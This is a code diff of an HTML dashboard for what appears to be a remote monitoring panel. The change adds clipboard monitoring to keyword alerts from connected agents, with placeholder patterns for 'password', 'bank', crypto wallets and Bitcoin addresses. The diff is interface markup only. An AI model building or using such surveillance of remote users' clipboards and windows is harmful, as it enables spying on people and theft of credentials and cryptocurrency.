@@ -35,7 +35,7 @@
           <div>
             <h1 class="text-2xl font-semibold">Notifications</h1>
             <p class="text-slate-400">
-              Active window alerts based on configured title keywords
+              Active window &amp; clipboard alerts based on configured keyword patterns
             </p>
           </div>
           <div class="flex flex-wrap items-center gap-3">
@@ -55,7 +55,7 @@
             <div>
               <h2 class="text-lg font-semibold">Keyword Configuration</h2>
               <p class="text-sm text-slate-400">
-                One keyword per line. Changes apply to connected agents immediately. (Shared global setting)
+                One keyword per line — plain substring or <code class="text-slate-300">/regex/i</code> syntax. Changes apply to connected agents immediately. (Shared global setting)
               </p>
             </div>
             <button
@@ -69,9 +69,13 @@
           <textarea
             id="keyword-input"
             rows="5"
-            placeholder="bank&#10;password&#10;admin"
+            placeholder="bank&#10;password&#10;admin&#10;/crypto|wallet/i&#10;/\b(bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{24,33})\b/"
             class="mt-3 w-full rounded-lg bg-slate-950 border border-slate-800 text-slate-100 p-3 focus:outline-none focus:border-blue-500"
           ></textarea>
+          <label class="mt-3 inline-flex items-center gap-2 text-sm text-slate-300 cursor-pointer">
+            <input id="clipboard-enabled" type="checkbox" class="w-4 h-4 accent-emerald-500" />
+            Monitor clipboard content for keyword matches
+          </label>
           <div class="mt-2 text-xs text-slate-500" id="keyword-hint"></div>
         </div>
 
@@ -267,9 +271,10 @@
                   <th class="py-2 pr-4">Time</th>
                   <th class="py-2 pr-4">Client</th>
                   <th class="py-2 pr-4">User</th>
-                  <th class="py-2 pr-4">Window Title</th>
+                  <th class="py-2 pr-4">Title / Content</th>
                   <th class="py-2 pr-4">Process</th>
                   <th class="py-2 pr-4">Keyword</th>
+                  <th class="py-2 pr-4">Source</th>
                   <th class="py-2 pr-4">Preview</th>
                 </tr>
               </thead>
